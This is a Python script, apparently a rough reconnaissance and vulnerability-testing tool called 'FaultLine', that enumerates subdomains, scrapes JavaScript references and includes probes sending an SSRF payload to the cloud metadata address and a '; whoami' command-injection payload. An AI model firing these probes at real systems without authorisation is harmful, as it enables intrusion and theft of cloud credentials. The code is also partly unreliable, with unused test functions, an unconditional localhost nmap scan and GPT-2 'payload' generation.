#!/usr/bin/env python3
import sys
import json
import requests
import time
import base64
import nmap
import concurrent.futures
from transformers import pipeline
import streamlit as st

def enumerate_subdomains(domain):
    url = f"https://crt.sh/?q={domain}&output=json"
    response = requests.get(url)
    if response.status_code == 200:
        subdomains = set(entry["name_value"] for entry in response.json())
        print("\n".join(subdomains))
    else:
        print(f"Error: {response.status_code}")

def parse_js(url):
    response = requests.get(url)
    if response.status_code == 200:
        js_files = [line.split('"')[1] for line in response.text.splitlines() if '.js' in line]
        print("\n".join(js_files))
    else:
        print(f"Error fetching {url}")

def test_ssrf(url):
    ssrf_payload = "http://169.254.169.254/latest/meta-data/"
    response = requests.get(f"{url}?url={ssrf_payload}")
    if "ami-id" in response.text:
        print("[+] SSRF Vulnerability Found!")

def test_command_injection(url):
    payload = "; whoami"
    response = requests.get(f"{url}?cmd={payload}")
    if "root" in response.text:
        print("[+] Command Injection Found!")


def measure_response_time(url):
    start = time.time()
    response = requests.get(url)
    end = time.time()
    print(f"Response Time for {url}: {end - start:.2f} seconds")

generator = pipeline('text-generation', model='gpt-2')
def generate_payloads(seed):
    payload = generator(seed, max_length=30, num_return_sequences=5)
    return [p['generated_text'] for p in payload]

def encode_payload(payload):
    return base64.b64encode(payload.encode()).decode()

def visualize_findings(vulnerabilities):
    st.title("FaultLine Findings")
    for vuln in vulnerabilities:
        st.write(vuln)

def scan_url(url):
    response = requests.get(url)
    print(f"{url}: {response.status_code}")

nm = nmap.PortScanner()
nm.scan('127.0.0.1', '22-80')
print(nm.csv())


#urls = ["http://example1.com", "http://example2.com"]
#with concurrent.futures.ThreadPoolExecutor() as executor:
#    executor.map(scan_url, urls)




def main():
    task = sys.argv[1]
    target = sys.argv[2]
    if task == "subdomains":
        enumerate_subdomains(target)
    elif task == "parse_js":
        parse_js(target)
    else:
        print("Unknown task.")

if __name__ == "__main__":
    main()
